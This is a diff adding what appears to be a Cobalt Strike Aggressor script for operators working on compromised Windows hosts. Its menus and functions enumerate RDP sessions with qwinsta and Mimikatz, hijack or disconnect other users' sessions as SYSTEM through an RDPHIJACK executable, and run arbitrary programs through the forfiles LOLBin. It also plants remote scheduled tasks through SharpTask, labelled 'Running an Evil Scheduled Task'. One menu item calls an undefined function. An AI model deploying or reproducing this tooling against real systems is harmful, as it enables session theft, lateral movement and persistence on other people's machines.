@@ -1,0 +1,203 @@
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		  Menus 		############################
+             
+#################################################
+
+#   RDP Hijacking T1563
+
+#################################################
+
+menu "RDP Hijacking" {
+
+menu "Session Enumeration"{
+
+# qwinsta local
+item "qwinsta (local) - T1563"{
+	local ('$bid');
+		foreach $bid ($1){
+			qwinstaloc($bid);
+		}
+}
+
+
+# qwinsta remote
+item "qwinsta (remote) - T1563"{
+	local ('$bid');
+		foreach $bid ($1){
+			qwinstarem($bid);
+		}
+}
+
+
+# Mimikatz TS::Sessions
+item "MimiKatz RDP Sessions - T1563"{
+	local ('$bid');
+		foreach $bid ($1){
+			mimisess($bid);
+		}
+}
+}
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and Hijack Session
+item "Hijack Session as SYSTEM"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpsys($bid);
+		}
+}
+		
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and redirect to console session
+item "Hijack Session as SYSTEM and redirect to console session"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpsyscon($bid);
+		}
+}
+		
+# SharpRDPHijack Hijack Remote Desktop session with user's password
+item "Hijack Session w/user password"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdppass($bid);
+		}
+}
+		
+# SharpRDPHijack Disconnect Session
+item "Disconnect RDP Session"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpdisconnect($bid);
+		}
+}
+		
+} #End of Menu
+
+#################################################
+
+#   LOLBins
+
+#################################################
+
+menu "LOLBins" {
+
+#Execute Menu
+	menu "Execute" {
+
+# LOLBin 'forfiles'
+item "forfiles  - T1218"{
+	local('$bid');
+		foreach $bid ($1){
+			forfiles($bid);
+		}
+	}
+}
+}
+
+#################################################
+
+#   SharpTask
+
+#################################################
+item "SharpTask  - T1053"{
+		local('$bid');
+				foreach $bid ($1){
+					sharptask($bid);
+				}
+			}
+
+    ###################################		         		###################################
+#######################################		         		#######################################
+  #####################################		         		#####################################
+           ############################		 Functions 		############################
+
+#################################################
+
+#   RDP Hijacking
+
+#################################################
+
+# qwinsta local
+sub qwinstaloc{
+brun($1, "qwinsta");
+}
+
+# qwinsta local
+sub qwinstarem{ 
+prompt_text("Server Name:", "", lambda({ 
+brun($bids, "qwinsta /server:$1"); 
+}, $bids => $1)); 
+}
+
+# MimiKatz TS::Sessions
+sub mimisess{
+bmimikatz($1, "ts::sessions");
+}
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and Hijack Session
+sub rdpsys{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1");
+}, $bids => $1)); 
+}
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and redierct to console session
+sub rdpsyscon{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1 --console");
+}, $bids => $1)); 
+}
+
+# SharpRDPHijack Hijack Remote Desktop session with user's password
+
+#NEED TO ADD
+
+# SharpRDPHijack Disconnect Session
+sub rdpdisconnect{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1 --disconnect");
+}, $bids => $1)); 
+}
+#################################################
+
+#   LOLBins
+
+#################################################
+
+#Execute 
+ 
+#LOLBin 'forfiles' 
+sub forfiles{ 
+prompt_text("Filepath To Executable", "", lambda({ 
+brun($bids, "forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c $1"); 
+}, $bids => $1)); 
+}
+
+#################################################
+
+#   SharpTask
+
+#################################################
+
+sub sharptask{
+$bid = $1;
+$dialog = dialog("Set up a Scheduled Task with Windows APIs", %(Computer => "", Time => "", Folder => "", Task_Name => "", Task_Description => "", Path_to_EXE => "", execmethod => "Execute-Assembly"), lambda({   
+$cmdargs = "";
+$cmdargs = "$3['Computer'] $3['Time'] $3['Folder'] $3['Task_Name'] $3['Task_Description'] $3['Path_to_EXE']"; 
+if ($3["execmethod"] eq "Execute-Assembly"){  
+btask($bid, 'Running an Evil Scheduled Task');  
+bexecute_assembly($bid, script_resource('/exe/SharpTask.exe'), "--AddTask $cmdargs");    
+}
+}));
+# Dialog box contents and text boxes mapped to command line argument keys   
+    dialog_description($dialog, "Enter The Following Information To Create A Scheduled Task On A Remote Machine:");
+    drow_text($dialog, "Computer",  "Computer");
+    drow_text($dialog, "Time",  "Time");
+    drow_text($dialog, "Folder",  "Folder");
+    drow_text($dialog, "Task_Name",  "Task Name");
+    drow_text($dialog, "Task_Description",  "Task Description");
+    drow_text($dialog, "Path_to_EXE",  "Path To Executable");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
